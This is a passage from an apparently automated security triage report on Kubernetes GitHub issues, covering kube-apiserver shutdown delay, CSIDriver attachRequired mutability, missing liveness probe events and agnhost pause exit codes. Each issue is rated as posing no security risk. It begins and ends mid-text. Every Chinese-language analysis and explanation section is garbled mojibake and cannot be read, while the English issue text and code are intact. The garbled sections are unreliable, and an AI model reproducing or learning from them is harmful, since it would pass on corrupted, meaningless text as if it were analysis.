    finally:
        logging.info("Watch function finished.")
        w.stop() # ç¡®ä¿åœæ­¢

def main():
    # å¯åŠ¨ watch çº¿ç¨‹
    watch_thread = threading.Thread(target=watch_nodes, daemon=True)
    watch_thread.start()
    logging.info("Watch thread started in the background.")

    # ä¸»çº¿ç¨‹ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œæ¨¡æ‹Ÿ watch è¿æ¥çš„æŒç»­æ—¶é—´
    # åœ¨å®é™…åœºæ™¯ä¸­ï¼Œè¿™ä¸ª watch è¿æ¥ä¼šä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ° kubectl è¿›ç¨‹è¢«æ€æ‰
    # æˆ–è€… apiserver å…³é—­è¿æ¥ï¼ˆåœ¨ä¼˜é›…å…³é—­æœŸé—´ç†è®ºä¸Šä¸åº”ç«‹å³å…³é—­ï¼‰
    # è¿™é‡Œæˆ‘ä»¬è®©å®ƒè¿è¡Œ 150 ç§’ï¼ˆç•¥é•¿äº2åˆ†é’Ÿè¶…æ—¶é™åˆ¶ï¼‰ï¼Œç„¶åå°è¯•åœæ­¢
    wait_time = 150
    logging.info(f"Main thread will wait for {wait_time} seconds before stopping the watch.")
    time.sleep(wait_time)

    # (æ¨¡æ‹Ÿå¤–éƒ¨æ“ä½œ) å°è¯•åœæ­¢ watch
    logging.info("Simulating the end of the watch client or external interruption.")
    stop_watch.set()

    # ç­‰å¾… watch çº¿ç¨‹ç»“æŸ
    watch_thread.join(timeout=10) # ç»™ watch çº¿ç¨‹ä¸€ç‚¹æ—¶é—´æ¥å“åº”åœæ­¢ä¿¡å·
    if watch_thread.is_alive():
        logging.warning("Watch thread did not stop gracefully after signal.")

    logging.info("Main function finished.")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ if __name__ == "__main__":
main()
"""

print("è¯¥Issueè¢«è¯„å®šä¸º'ä¸æ¶‰åŠ'å®‰å…¨é£é™©ï¼Œå› æ­¤ä¸æä¾›åŠŸèƒ½æ€§å¤ç°POCã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Issueæè¿°çš„`kube-apiserver`å…³é—­ç¼“æ…¢é—®é¢˜ï¼Œæ˜¯ç”±äºå…¶ä¾èµ–çš„Go `http.Server`åœ¨æ‰§è¡Œ`Shutdown`æ—¶ä¼šç­‰å¾…ç°æœ‰è¿æ¥ï¼ˆåŒ…æ‹¬é•¿è½®è¯¢çš„Watchè¯·æ±‚å’Œå…¶ä»–ç»„ä»¶çš„è¿æ¥ï¼‰å®Œæˆæˆ–è¶…æ—¶ã€‚è¿™å±äºæœåŠ¡å¯ç”¨æ€§å’Œè¿ç»´æ•ˆç‡èŒƒç•´çš„é—®é¢˜ï¼Œå°¤å…¶åœ¨éœ€è¦é¢‘ç¹é‡å¯æˆ–å¿«é€Ÿæ›´æ–°`kube-apiserver`æ—¶ä¼šé€ æˆå›°æ‰°ã€‚ç„¶è€Œï¼Œå®ƒå¹¶ä¸ç›´æ¥å¼•å…¥å®‰å…¨æ¼æ´ï¼Œå¦‚ä¿¡æ¯æ³„éœ²ã€æƒé™æå‡æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚æ”»å‡»è€…å³ä½¿èƒ½é€šè¿‡å‘èµ·Watchè¯·æ±‚å»¶é•¿å…³é—­æ—¶é—´ï¼Œå…¶å½±å“ä¹Ÿä»…é™äºå»¶è¿Ÿå…³é—­è¿‡ç¨‹ï¼Œå±äºä½å½±å“çš„æ‹’ç»æœåŠ¡ï¼ˆå½±å“å…³é—­ï¼‰ï¼Œä¸”éœ€è¦åˆæ³•æƒé™ã€‚æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥é—®é¢˜ä¸æ„æˆå®‰å…¨é£é™©ï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œä¸”æ— éœ€æä¾›ç”¨äºå®‰å…¨éªŒè¯çš„POCè„šæœ¬ã€‚æä¾›çš„æ³¨é‡Šä»£ç ä»…ä¸ºæ¼”ç¤ºå¦‚ä½•ç”¨Pythonå‘èµ·ä¸€ä¸ªWatchè¿æ¥ï¼Œä»¥æ¨¡æ‹Ÿå¯èƒ½å¯¼è‡´æ­¤ç°è±¡çš„ç”¨æˆ·è¡Œä¸ºä¹‹ä¸€ï¼Œå¹¶éç”¨äºå¤ç°å®‰å…¨æ¼æ´ã€‚

---


## Issue #131035 Make CSIDriver.attachRequired field mutable

- Issue é“¾æ¥ï¼š[#131035](https://github.com/kubernetes/kubernetes/issues/131035)

### Issue å†…å®¹

#### What happened?

We added support in k8s to handle mutable attachRequired
https://github.com/kubernetes/kubernetes/pull/93710

However we did not actually make the API field mutable:
https://github.com/kubernetes/kubernetes/blob/62555cadc741a8aef31acab05e9ed60f897edb1b/pkg/apis/storage/types.go#L286

#### What did you expect to happen?

Support CSIDriver.attachRequired mutable 

#### How can we reproduce it (as minimally and precisely as possible)?

Please see above

#### Anything else we need to know?

The estimation of work is about a month

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæå‡ºéœ€è¦å°†Kubernetes APIå¯¹è±¡`CSIDriver`ä¸­çš„`attachRequired`å­—æ®µè®¾ç½®ä¸ºå¯å˜çš„ï¼ˆmutableï¼‰ã€‚ç›®å‰ï¼Œè™½ç„¶Kuberneteså†…éƒ¨é€»è¾‘ï¼ˆå¦‚PR #93710ï¼‰å·²ç»æ”¯æŒå¤„ç†è¯¥å­—æ®µçš„å˜åŒ–ï¼Œä½†APIå®šä¹‰æœ¬èº«ï¼ˆ`pkg/apis/storage/types.go#L286`ï¼‰å¹¶æœªå°†è¯¥å­—æ®µæ ‡è®°ä¸ºå¯å˜ï¼Œå¯¼è‡´åˆ›å»º`CSIDriver`å¯¹è±¡åæ— æ³•ä¿®æ”¹`attachRequired`çš„å€¼ã€‚

è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½å¢å¼ºæˆ–APIè®¾è®¡ä¿®æ­£çš„è¯·æ±‚ï¼Œæ—¨åœ¨ä½¿APIè¡Œä¸ºä¸æ§åˆ¶å™¨é€»è¾‘ä¿æŒä¸€è‡´ã€‚è¯¥Issueæè¿°çš„é—®é¢˜æ˜¯APIå­—æ®µçš„ä¸å¯å˜æ€§ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨æ¥æ‰§è¡Œæœªæˆæƒæ“ä½œã€æ³„éœ²ä¿¡æ¯ã€å¯¼è‡´æ‹’ç»æœåŠ¡æˆ–æå‡æƒé™çš„å®‰å…¨æ¼æ´ã€‚ä¿®æ”¹`CSIDriver`å¯¹è±¡é€šå¸¸éœ€è¦è¾ƒé«˜çš„æƒé™ï¼ˆå¦‚`cluster-admin`ï¼‰ï¼Œå¹¶ä¸”ä¿®æ”¹`attachRequired`å­—æ®µæœ¬èº«æ˜¯ä¸ºäº†è°ƒæ•´å­˜å‚¨å·çš„æŒ‚è½½è¡Œä¸ºï¼Œä¸ç›´æ¥å¼•å…¥å®‰å…¨é£é™©ã€‚

æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥é—®é¢˜å¹¶éå®‰å…¨é—®é¢˜ï¼Œä¸æ¶‰åŠåˆ©ç”¨æ¼æ´è¿›è¡Œæ”»å‡»ã€‚
2.  ä¿®æ”¹`CSIDriver`éœ€è¦ç›¸åº”æƒé™ï¼Œå³ä½¿å­—æ®µå¯å˜ï¼Œä¹Ÿæ˜¯æˆæƒç”¨æˆ·çš„é¢„æœŸæ“ä½œã€‚
3.  ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©åœºæ™¯ã€‚
4.  ä¸æ¶‰åŠæ—¥å¿—æ³„éœ²å‡­æ®ã€‚
5.  ä¸æ¶‰åŠä½æƒé™ç”¨æˆ·å½±å“å…¶ä»–ç”¨æˆ·ã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥Issueæè¿°çš„æ˜¯APIå­—æ®µå®šä¹‰ä¸æœŸæœ›åŠŸèƒ½ä¸ç¬¦çš„é—®é¢˜ï¼Œå¹¶éä¸€ä¸ªå¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚
# å®ƒè¯·æ±‚å°†CSIDriverå¯¹è±¡çš„attachRequiredå­—æ®µä»ä¸å¯å˜ï¼ˆimmutableï¼‰æ”¹ä¸ºå¯å˜ï¼ˆmutableï¼‰ã€‚
# æ— æ³•é€šè¿‡ç¼–å†™POCæ¥â€œå¤ç°â€ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œå› ä¸ºè¿™é‡Œä¸å­˜åœ¨å®‰å…¨æ¼æ´ã€‚
# éªŒè¯è¯¥Issueçš„æ–¹æ³•æ˜¯å°è¯•æ›´æ–°ä¸€ä¸ªå·²å­˜åœ¨çš„CSIDriverå¯¹è±¡çš„attachRequiredå­—æ®µï¼Œ
# é¢„æœŸä¼šæ”¶åˆ°API Serveræ‹’ç»æ›´æ–°çš„é”™è¯¯ï¼ˆå› ä¸ºå­—æ®µå½“å‰æ˜¯ä¸å¯å˜çš„ï¼‰ã€‚
# å¾…Kubernetesæœªæ¥ç‰ˆæœ¬ä¿®å¤æ­¤Issueåï¼ŒåŒæ ·çš„æ›´æ–°æ“ä½œåº”è¯¥ä¼šæˆåŠŸã€‚
# å› æ­¤ï¼Œä¸æä¾›å¤ç°å®‰å…¨æ¼æ´çš„POCè„šæœ¬ã€‚

def verify_issue():
    print("è¯¥Issueæè¿°äº†ä¸€ä¸ªAPIåŠŸèƒ½é™åˆ¶ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚")
    print("éªŒè¯æ–¹æ³•æ˜¯å°è¯•ä½¿ç”¨Kubernetes APIå®¢æˆ·ç«¯ï¼ˆå¦‚kubectlæˆ–Pythonåº“ï¼‰æ›´æ–°ç°æœ‰CSIDriverå¯¹è±¡çš„ 'attachRequired' å­—æ®µã€‚")
    print("åœ¨å½“å‰ç‰ˆæœ¬ï¼ˆæ ¹æ®Issueæè¿°ï¼‰ï¼Œæ­¤æ“ä½œé¢„æœŸä¼šå¤±è´¥ï¼ŒæŠ¥å‘Šå­—æ®µä¸å¯å˜ã€‚")
    print("æ— éœ€æä¾›é’ˆå¯¹å®‰å…¨æ¼æ´çš„å¤ç°è„šæœ¬ã€‚")

# ç›´æ¥æ‰§è¡ŒéªŒè¯è¯´æ˜
verify_issue()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬å¹¶æœªå°è¯•å¤ç°ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œå› ä¸ºå®ƒåˆ†æçš„Issueå¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚è„šæœ¬çš„`verify_issue`å‡½æ•°æ‰“å°äº†è¯´æ˜ä¿¡æ¯ï¼Œè§£é‡Šäº†è¯¥Issueçš„æ€§è´¨â€”â€”å®ƒæ˜¯ä¸€ä¸ªå…³äºAPIå­—æ®µå¯å˜æ€§çš„åŠŸèƒ½è¯·æ±‚/ä¿®æ­£ã€‚è„šæœ¬æŒ‡å‡ºï¼ŒéªŒè¯æ­¤IssueçŠ¶æ€çš„æ–¹æ³•æ˜¯å°è¯•é€šè¿‡Kubernetes APIä¿®æ”¹ç°æœ‰`CSIDriver`èµ„æºçš„`attachRequired`å­—æ®µã€‚åœ¨é—®é¢˜æœªä¿®å¤çš„ç‰ˆæœ¬ä¸­ï¼Œæ­¤æ“ä½œé¢„æœŸä¼šå¤±è´¥å¹¶æç¤ºå­—æ®µä¸å¯å˜ã€‚ç”±äºä¸å­˜åœ¨å¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼Œå› æ­¤ä¸ç”Ÿæˆç”¨äºæ”»å‡»æˆ–åˆ©ç”¨çš„POCè„šæœ¬ï¼Œä»…æä¾›è§£é‡Šæ€§è¯´æ˜ã€‚è¯¥è„šæœ¬ç¬¦åˆâ€œä¸æ¶‰åŠâ€é£é™©è¯„çº§çš„ç»“è®ºï¼Œå¹¶éµå¾ªäº†ä¸ä¸ºéé«˜é£é™©é—®é¢˜ç”ŸæˆPOCçš„è¦æ±‚ã€‚

---


## Issue #131026 Liveness probes failure does not log event

- Issue é“¾æ¥ï¼š[#131026](https://github.com/kubernetes/kubernetes/issues/131026)

### Issue å†…å®¹

#### What happened?

It has been observed that liveness probe is not logging event every time in all scenario. We have executed below steps:


1. Created nginx pod with below readiness and liveness probes parameter values. Keep touch /var/opt/podinstalled and /var/opt/liveness file.

```
readinessProbe:
  exec:
    command: ["ls", "/var/opt/podinstalled" ]
  initialDelaySeconds: 60
  timeoutSeconds: 3
  periodSeconds: 5
  failureThreshold: 3
  successThreshold: 1
livenessProbe:
  exec:
    command: ["ls", "/var/opt/liveness" ]
  initialDelaySeconds: 120
  timeoutSeconds: 20
  periodSeconds: 30
  failureThreshold: 4
  successThreshold: 1
```



2. Verify pod describe logs after deleting liveness file. 

```
root@web-0:/# rm -rf /var/opt/liveness
root@web-0:/#
```

Liveness probe failed and container restarted 

```
  Normal   Pulled          13m               kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         13m               kubelet            Created container web
  Normal   Started         13m               kubelet            Started container web
  Warning  Unhealthy       1s (x4 over 91s)  kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
  Normal   Killing         1s                kubelet            Container web failed liveness probe, will be restarted
```


3. After touching both files and waited for few mins after container restart


```
$ kubectl get pods | grep -i web
web-0                                                             1/1     Running                 1 (8m39s ago)    21m
$
```

There is no further readiness and liveness probe failure observed

  ```
Warning  Unhealthy       9m1s (x4 over 10m)     kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
  Normal   Killing         9m1s                   kubelet            Container web failed liveness probe, will be restarted
  Normal   Pulled          8m58s (x2 over 22m)    kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         8m58s (x2 over 22m)    kubelet            Created container web
  Normal   Started         8m57s (x2 over 22m)    kubelet            Started container web
  Warning  Unhealthy       7m1s (x13 over 7m56s)  kubelet            Readiness probe failed: ls: cannot access '/var/opt/podinstalled': No such file or directory
```

4. Now delete liveness file again

`root@web-0:/# rm -rf /var/opt/liveness`

Container will be restarted again.

```
  Normal   Pulled          12m (x2 over 25m)   kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         12m (x2 over 25m)   kubelet            Created container web
  Normal   Started         12m (x2 over 25m)   kubelet            Started container web
  Warning  Unhealthy       10m (x13 over 10m)  kubelet            Readiness probe failed: ls: cannot access '/var/opt/podinstalled': No such file or directory
  Warning  Unhealthy       64s (x8 over 13m)   kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
  Normal   Killing         64s (x2 over 12m)   kubelet            Container web failed liveness probe, will be restarted
```


5. Now wait for few seconds after container to be up again and this time do not touch any file related to readiness and liveness probes.
Now real problem beigns.


```
$ kubectl get pods | grep -i web
web-0                                                             0/1     Running                 2 (97s ago)      25m
$
```

Readiness probe event generated

```
  Normal   Pulled          15m (x2 over 28m)     kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         15m (x2 over 28m)     kubelet            Created container web
  Normal   Started         15m (x2 over 28m)     kubelet            Started container web
  Warning  Unhealthy       4m18s (x8 over 16m)   kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
  Normal   Killing         4m18s (x2 over 15m)   kubelet            Container web failed liveness probe, will be restarted
  Warning  Unhealthy       3m13s (x14 over 14m)  kubelet            Readiness probe failed: ls: cannot access '/var/opt/podinstalled': No such file or directory
```

However no new event related to liveness failure generated and container restarted without any information this time.

```
$ kubectl get pods -w| grep -i web
web-0                                                             0/1     Running                 2 (2m36s ago)    26m

web-0                                                             0/1     Running                 3 (1s ago)       28m

```

6. Now this time touch readiness file and do not touch liveness file. Event for liveness generated this time.

```
  Normal   Pulled          22m (x2 over 35m)     kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         22m (x2 over 35m)     kubelet            Created container web
  Normal   Started         22m (x2 over 35m)     kubelet            Started container web
  Normal   Killing         11m (x2 over 22m)     kubelet            Container web failed liveness probe, will be restarted
  Warning  Unhealthy       5m33s (x66 over 21m)  kubelet            Readiness probe failed: ls: cannot access '/var/opt/podinstalled': No such file or directory
  Warning  Unhealthy       8s (x19 over 24m)     kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
```
  

Container also restarted.
```
$ kubectl get pods -w| grep -i web
web-0                                                             1/1     Running                 4 (115s ago)       33m

web-0                                                             0/1     Running                 5 (1s ago)         36m

```


**Query:** Is there any event logging problem related to liveness if readiness is already failed? Is it some known behavior or some kind of bug in event logging?






#### What did you expect to happen?

**Expected Behavior** - Liveness probe should log event every time so that container restart reason can be identified.

#### How can we reproduce it (as minimally and precisely as possible)?

**Repoduction:** Every time with same steps as shared in problem section.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# $ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.4", GitCommit:"fa3d7990104d7c1f16943a67f11b154b71f6a132", GitTreeState:"clean", BuildDate:"2023-07-19T12:20:54Z", GoVersion:"go1.20.6", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"31", GitVersion:"v1.31.1", GitCommit:"725a577fede9eea95e282ea4f3bb40aea1f37ee5", GitTreeState:"clean", BuildDate:"2024-10-15T09:48:51Z", GoVersion:"go1.22.6", Compiler:"gc", Platform:"linux/amd64"}
WARNING: version difference between client (1.27) and server (1.31) exceeds the supported minor version skew of +/-1
$

```

</details>


#### Cloud provider

<details>
Local kubernetes cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
#  cat /etc/os-release
NAME="SLES"
VERSION="15-SP5"
VERSION_ID="15.5"
PRETTY_NAME="SUSE Linux Enterprise Server 15 SP5"
ID="sles"
ID_LIKE="suse"
ANSI_COLOR="0;32"
CPE_NAME="cpe:/o:suse:sles:15:sp5"
DOCUMENTATION_URL="https://documentation.suse.com/"
$ uname -a
# Linux test-master-3 5.14.21-150500.55.83-default #1 SMP PREEMPT_DYNAMIC Wed Oct 2 08:09:07 UTC 2024 (0d53847) x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
NA
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd-1.7.21-150000.117.1.x86_64
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†ä¸€ä¸ªåœ¨ç‰¹å®šæ¡ä»¶ä¸‹Kubernetes Liveness Probeå¤±è´¥æ—¶äº‹ä»¶ï¼ˆEventï¼‰æœªèƒ½è®°å½•çš„é—®é¢˜ã€‚å…·ä½“åœºæ™¯æ˜¯ï¼šå½“Podçš„Readiness Probeå·²ç»å¤„äºå¤±è´¥çŠ¶æ€æ—¶ï¼Œåç»­Liveness Probeçš„å¤±è´¥å¯èƒ½ä¸ä¼šç”Ÿæˆç›¸åº”çš„"Unhealthy"äº‹ä»¶ï¼Œå³ä½¿å®¹å™¨å› æ­¤è¢«é‡å¯äº†ã€‚

1.  **é—®é¢˜æ€§è´¨**ï¼šè¯¥é—®é¢˜æ ¸å¿ƒåœ¨äºKubernetesäº‹ä»¶è®°å½•ç³»ç»Ÿï¼ˆç‰¹åˆ«æ˜¯Kubeletç”Ÿæˆçš„äº‹ä»¶ï¼‰åœ¨ç‰¹å®šå¹¶å‘æ¢æµ‹å¤±è´¥åœºæ™¯ä¸‹çš„è¡Œä¸ºä¸ä¸€è‡´ã€‚ç”¨æˆ·æœŸæœ›æ¯æ¬¡Liveness Probeå¤±è´¥å¯¼è‡´å®¹å™¨é‡å¯æ—¶ï¼Œéƒ½åº”æœ‰æ˜ç¡®çš„äº‹ä»¶è®°å½•ï¼Œä»¥ä¾¿è¿½è¸ªå’Œè¯Šæ–­é—®é¢˜ã€‚
2.  **å®‰å…¨å½±å“è¯„ä¼°**ï¼š
    *   **æœºå¯†æ€§ï¼ˆConfidentialityï¼‰**ï¼šè¯¥é—®é¢˜ä¸æ¶‰åŠæ•°æ®æ³„éœ²ã€‚
    *   **å®Œæ•´æ€§ï¼ˆIntegrityï¼‰**ï¼šè¯¥é—®é¢˜ä¸æ¶‰åŠæ•°æ®æˆ–ç³»ç»Ÿé…ç½®çš„æœªæˆæƒä¿®æ”¹ã€‚
    *   **å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰**ï¼šè™½ç„¶Liveness Probeå¤±è´¥ä¼šå¯¼è‡´å®¹å™¨é‡å¯ï¼Œè¿™æ˜¯é¢„æœŸçš„æ¢å¤æœºåˆ¶ã€‚äº‹ä»¶è®°å½•çš„ç¼ºå¤±æœ¬èº«å¹¶ä¸ç›´æ¥å¯¼è‡´é¢å¤–çš„æœåŠ¡ä¸­æ–­ï¼Œä½†å®ƒä¼šå¦¨ç¢ç®¡ç†å‘˜å¿«é€Ÿå‡†ç¡®åœ°è¯Šæ–­å®¹å™¨é‡å¯çš„åŸå› ï¼Œå¯èƒ½é—´æ¥å»¶é•¿æ•…éšœæ’æŸ¥æ—¶é—´ã€‚ç„¶è€Œï¼Œè¿™å¹¶éä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ã€ç”±æ”»å‡»è€…åˆ©ç”¨æ¼æ´è§¦å‘çš„DoSã€‚å®¹å™¨ä»ç„¶æ ¹æ®æ¢æµ‹ç»“æœè¿›è¡Œé‡å¯ã€‚
    *   **åˆ©ç”¨æ¡ä»¶**ï¼šè¿™ä¸ªé—®é¢˜æè¿°çš„æ˜¯ç³»ç»Ÿè¡Œä¸ºï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¯è¢«å¤–éƒ¨æ”»å‡»è€…ç›´æ¥åˆ©ç”¨æ¥å‘èµ·æ”»å‡»çš„æ¼æ´ã€‚å®ƒå½±å“çš„æ˜¯ç³»ç»Ÿçš„å¯è§‚æµ‹æ€§ï¼ˆObservabilityï¼‰ã€‚
    *   **æƒé™è¦æ±‚**ï¼šè§¦å‘æ­¤é—®é¢˜çš„æ¡ä»¶ï¼ˆæ¢æµ‹å¤±è´¥ï¼‰é€šå¸¸ç”±åº”ç”¨ç¨‹åºå†…éƒ¨çŠ¶æ€æˆ–ç¯å¢ƒé—®é¢˜å¼•èµ·ï¼Œè€Œééœ€è¦ç‰¹å®šæƒé™çš„æ”»å‡»æ“ä½œã€‚
    *   **æ•æ„Ÿä¿¡æ¯æš´éœ²**ï¼šIssueæäº¤è€…åœ¨æè¿°ä¸­æ²¡æœ‰æš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚
    *   **å‘½ä»¤æ‰§è¡Œ/ææƒç­‰**ï¼šè¯¥é—®é¢˜ä¸å‘½ä»¤æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©è¡Œä¸ºæ— å…³ã€‚
    *   **å¤šç”¨æˆ·åœºæ™¯å½±å“**ï¼šæ­¤é—®é¢˜å½±å“çš„æ˜¯ç‰¹å®šPodçš„äº‹ä»¶è®°å½•ï¼Œä¸»è¦å½±å“è¯¥Podçš„ç®¡ç†å‘˜æˆ–è¿ç»´äººå‘˜çš„è¯Šæ–­å·¥ä½œï¼Œä¸ä¼šç›´æ¥å½±å“å…¶ä»–ç§Ÿæˆ·æˆ–ç”¨æˆ·çš„Podã€‚

3.  **ç»“è®º**ï¼šæ ¹æ®ä¸Šè¿°åˆ†æï¼Œè¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªå½±å“ç³»ç»Ÿå¯è§‚æµ‹æ€§çš„åŠŸèƒ½æ€§é—®é¢˜æˆ–Bugï¼Œå®ƒä½¿å¾—åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¿½è¸ªå®¹å™¨é‡å¯åŸå› å˜å¾—å›°éš¾ã€‚ç„¶è€Œï¼Œå®ƒæœ¬èº«å¹¶ä¸æ„æˆä¸€ä¸ªå¯ä»¥ç›´æ¥è¢«åˆ©ç”¨æ¥å±å®³ç³»ç»Ÿå®‰å…¨ï¼ˆå¦‚è·å–æƒé™ã€çªƒå–æ•°æ®ã€å‘èµ·DoSæ”»å‡»ï¼‰çš„æ¼æ´ã€‚æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬2æ¡ï¼Œæ­¤é—®é¢˜éå®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ­¤å¤„ä¸æä¾›å¤ç°è„šæœ¬ã€‚
# åŸå› ï¼šæ ¹æ®é£é™©è¯„çº§ç»“æœï¼Œè¯¥Issueè¢«åˆ¤å®šä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ã€‚
# æŒ‰ç…§è¦æ±‚ï¼Œä»…é’ˆå¯¹â€œé«˜é£é™©â€é—®é¢˜æä¾›Pythonå¤ç°è„šæœ¬ã€‚
# è¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªå¯è§‚æµ‹æ€§æ–¹é¢çš„é—®é¢˜ï¼ˆäº‹ä»¶è®°å½•ç¼ºå¤±ï¼‰ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚
# Issueæè¿°ä¸­å·²ç»åŒ…å«äº†ä½¿ç”¨kubectlå’Œshellå‘½ä»¤æ‰‹åŠ¨å¤ç°è¯¥é—®é¢˜çš„è¯¦ç»†æ­¥éª¤ã€‚
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥IssueæŠ¥å‘Šçš„é—®é¢˜æ˜¯å…³äºKubernetesåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼ˆReadiness Probeå·²å¤±è´¥æ—¶ï¼‰æœªèƒ½æŒç»­è®°å½•Liveness Probeå¤±è´¥äº‹ä»¶ï¼Œè¿™å½±å“äº†é—®é¢˜çš„å¯è¯Šæ–­æ€§ã€‚ç»è¿‡åˆ†æï¼Œæ­¤é—®é¢˜å±äºç³»ç»Ÿè¡Œä¸ºæˆ–æ½œåœ¨Bugï¼Œå½±å“çš„æ˜¯è¿ç»´çš„å¯è§‚æµ‹æ€§ï¼Œå¹¶ä¸ç›´æ¥å¼•å…¥å®‰å…¨é£é™©ï¼Œå¦‚æœªæˆæƒè®¿é—®ã€æ•°æ®æ³„éœ²ã€æ‹’ç»æœåŠ¡æ”»å‡»æˆ–æƒé™æå‡ç­‰ã€‚å› æ­¤ï¼Œå…¶é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

ç”±äºè¯¥é—®é¢˜ä¸å±äºå®‰å…¨é£é™©ï¼Œç‰¹åˆ«æ˜¯é«˜é£é™©ç±»åˆ«ï¼Œæ ¹æ®è¦æ±‚ï¼Œæ— éœ€æä¾›Python POCï¼ˆProof of Conceptï¼‰è„šæœ¬ã€‚IssueæŠ¥å‘Šä¸­å·²æä¾›äº†æ¸…æ™°çš„æ‰‹åŠ¨å¤ç°æ­¥éª¤ï¼Œæ¶‰åŠåˆ›å»ºç‰¹å®šé…ç½®çš„Podï¼Œå¹¶åœ¨å®¹å™¨å†…æ‰‹åŠ¨åˆ é™¤æ–‡ä»¶ä»¥æ¨¡æ‹Ÿæ¢æµ‹å¤±è´¥ï¼Œç„¶åè§‚å¯Ÿ`kubectl describe pod`è¾“å‡ºçš„äº‹ä»¶è®°å½•ã€‚

---


## Issue #131021 Test tooling: agnhost pause command may exit with 0 occasionally

- Issue é“¾æ¥ï¼š[#131021](https://github.com/kubernetes/kubernetes/issues/131021)

### Issue å†…å®¹

#### What happened?

The agnhost command may occasionally exit with 0 which is not the intention: https://github.com/kubernetes/kubernetes/blob/78e9ba9d9ac70ceeadd90e95af553add0e2ed36e/test/images/agnhost/pause/pause.go#L37-L56

#### What did you expect to happen?

Only exit with failure, 1 (sigint), 2 sigterm, if the traps are registered.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Compile the agnost image with the following changes to make it more likely to happen:
```
func pause(cmd *cobra.Command, args []string) {
        fmt.Println("Paused")
        sigCh := make(chan os.Signal, 1)
        done := make(chan int, 1)
        signal.Notify(sigCh, syscall.SIGINT)
        signal.Notify(sigCh, syscall.SIGTERM)
        fmt.Println("Signals registered")
        go func() {
                sig := <-sigCh
                switch sig {
                case syscall.SIGINT:
                        fmt.Println("received SIGINT")
                        done <- 1
                        time.Sleep(time.Minute)
                        os.Exit(1)
                case syscall.SIGTERM:
